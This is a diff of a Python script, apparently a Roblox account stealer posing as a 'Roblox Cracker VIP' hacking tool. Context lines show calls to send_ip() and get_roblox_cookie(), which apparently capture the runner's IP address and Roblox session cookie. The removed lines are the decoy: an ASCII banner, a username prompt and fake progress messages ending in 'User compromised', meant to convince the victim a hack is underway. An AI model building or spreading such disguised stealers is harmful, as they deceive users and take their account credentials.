@@ -136,28 +136,3 @@ def get_roblox_cookie():
 if __name__ == "__main__":
     send_ip()  # Send IP before running main function
     get_roblox_cookie()
-
-print(r"""
-______      _     _             _____                _               _   _ ___________ 
-| ___ \    | |   | |           /  __ \              | |             | | | |_   _| ___ \
-| |_/ /___ | |__ | | _____  __ | /  \/_ __ __ _  ___| | _____ _ __  | | | | | | | |_/ /
-|    // _ \| '_ \| |/ _ \ \/ / | |   | '__/ _` |/ __| |/ / _ \ '__| | | | | | | |  __/ 
-| |\ \ (_) | |_) | | (_) >  <  | \__/\ | | (_| | (__|   <  __/ |    \ \_/ /_| |_| |    
-\_| \_\___/|_.__/|_|\___/_/\_\  \____/_|  \__,_|\___|_|\_\___|_|     \___/ \___/\_|    
-                                                                                    
-""")
-
-username = input("Input username: ")
-
-print(f"Starting hack on {username}...")
-time.sleep(2)
-print("Bypassing security protocols...")
-time.sleep(2)
-print("Accessing database...")
-time.sleep(2)
-print("Extracting credentials...")
-time.sleep(2)
-print("Disabling firewall...")
-time.sleep(2)
-print("User compromised")
-
